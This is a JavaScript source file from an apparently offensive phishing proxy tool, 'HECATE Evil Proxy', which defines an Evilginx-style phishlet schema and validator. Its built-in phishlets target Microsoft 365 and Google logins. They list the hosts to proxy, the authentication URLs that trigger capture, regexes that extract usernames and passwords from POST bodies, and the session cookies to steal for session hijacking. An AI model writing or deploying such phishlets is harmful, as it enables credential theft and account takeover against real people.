'use strict';

/**
 * HECATE Evil Proxy — Phishlet Schema
 * Defines the phishlet data structure and validates loaded configs.
 *
 * Phishlet format (JSON). Evilginx3 YAML phishlets can be imported
 * via: hecate evil-proxy import-phishlet --file target.yaml
 *
 * Key concepts:
 *   proxyHosts   — maps phishing subdomains to origin subdomains
 *   authUrls     — URL paths that indicate auth is complete (trigger token capture)
 *   credentials  — regex patterns to extract from POST bodies
 *   authTokens   — cookie names to capture for session hijack
 */

const REQUIRED_FIELDS = ['name', 'proxyHosts', 'authTokens'];

/**
 * Validate a phishlet object.
 * Throws descriptively on any schema violation.
 */
function validate(p, source = '<unknown>') {
  for (const f of REQUIRED_FIELDS) {
    if (p[f] == null) throw new Error(`Phishlet ${source}: missing required field '${f}'`);
  }

  if (!Array.isArray(p.proxyHosts) || p.proxyHosts.length === 0) {
    throw new Error(`Phishlet ${source}: proxyHosts must be a non-empty array`);
  }

  for (const [i, h] of p.proxyHosts.entries()) {
    if (!h.origSub  && h.origSub  !== '') throw new Error(`Phishlet ${source}: proxyHosts[${i}].origSub required`);
    if (!h.phishSub && h.phishSub !== '') throw new Error(`Phishlet ${source}: proxyHosts[${i}].phishSub required`);
    if (!h.domain)                        throw new Error(`Phishlet ${source}: proxyHosts[${i}].domain required`);
  }

  if (!Array.isArray(p.authTokens) || p.authTokens.length === 0) {
    throw new Error(`Phishlet ${source}: authTokens must be a non-empty array`);
  }

  for (const [i, t] of p.authTokens.entries()) {
    if (!t.domain) throw new Error(`Phishlet ${source}: authTokens[${i}].domain required`);
    if (!Array.isArray(t.keys) || !t.keys.length) {
      throw new Error(`Phishlet ${source}: authTokens[${i}].keys must be non-empty array`);
    }
  }

  if (p.credentials) {
    for (const [i, c] of p.credentials.entries()) {
      if (!c.key)    throw new Error(`Phishlet ${source}: credentials[${i}].key required`);
      if (!c.search) throw new Error(`Phishlet ${source}: credentials[${i}].search required`);
    }
  }
}

/**
 * Normalise a raw phishlet object — fill defaults, compile regexes.
 */
function normalise(raw) {
  const p = {
    name:        raw.name,
    version:     raw.version     ?? '1.0',
    author:      raw.author      ?? 'unknown',
    proxyHosts:  raw.proxyHosts  ?? [],
    authUrls:    raw.authUrls    ?? [],
    credentials: (raw.credentials ?? []).map(c => ({
      key:    c.key,
      type:   c.type   ?? 'post',    // post | cookie | header
      search: c.search,
      re:     new RegExp(c.search, 'i'),
    })),
    authTokens:  raw.authTokens  ?? [],
    injectJs:    raw.injectJs    ?? null,
    forceHttps:  raw.forceHttps  ?? true,
    enabled:     raw.enabled     ?? true,
  };

  // Build lookup: phishing hostname → origin hostname
  p._hostMap    = new Map();  // phish host → origin host
  p._reverseMap = new Map();  // origin host → phish host

  return p;
}

// ── Built-in example phishlets ────────────────────────────────────────────────
// These are structural templates only — operators must configure their own
// phishing domain before use.

const EXAMPLES = {

  'generic-login': {
    name:       'generic-login',
    version:    '1.0',
    author:     'hecate',
    proxyHosts: [
      { phishSub: '', origSub: '', domain: 'TARGET_DOMAIN', session: true, isLanding: true },
    ],
    authUrls:   ['/login', '/auth', '/session'],
    credentials: [
      { key: 'username', search: '(?:username|user|email|login)=([^&]+)', type: 'post' },
      { key: 'password', search: '(?:password|passwd|pass|pwd)=([^&]+)',  type: 'post' },
    ],
    authTokens: [
      { domain: '.TARGET_DOMAIN', keys: ['session', 'auth', 'token', 'jwt'] },
    ],
  },

  'o365': {
    name:       'o365',
    version:    '1.0',
    author:     'hecate',
    proxyHosts: [
      { phishSub: 'login',   origSub: 'login',   domain: 'microsoftonline.com', session: true, isLanding: true },
      { phishSub: 'account', origSub: 'account', domain: 'microsoft.com',       session: false },
    ],
    authUrls:   ['/common/oauth2/v2.0/token', '/kmsi', '/common/SAS/ProcessAuth'],
    credentials: [
      { key: 'username', search: 'login=([^&]+)',  type: 'post' },
      { key: 'password', search: 'passwd=([^&]+)', type: 'post' },
    ],
    authTokens: [
      { domain: '.microsoftonline.com', keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid', 'esctx'] },
      { domain: '.microsoft.com',       keys: ['MC1', 'MS0'] },
    ],
  },

  'google': {
    name:       'google',
    version:    '1.0',
    author:     'hecate',
    proxyHosts: [
      { phishSub: 'accounts', origSub: 'accounts', domain: 'google.com', session: true, isLanding: true },
    ],
    authUrls:   ['/_/signin/sl/lookup', '/_/signin/challenge/pwd', '/ServiceLogin'],
    credentials: [
      { key: 'username', search: 'Email=([^&]+)',    type: 'post' },
      { key: 'password', search: 'Passwd=([^&]+)',   type: 'post' },
    ],
    authTokens: [
      { domain: '.google.com', keys: ['SSID', 'HSID', 'APISID', 'SAPISID', 'SID', 'LSID', 'accounts.google.com:SID'] },
    ],
  },
};

module.exports = { validate, normalise, EXAMPLES };
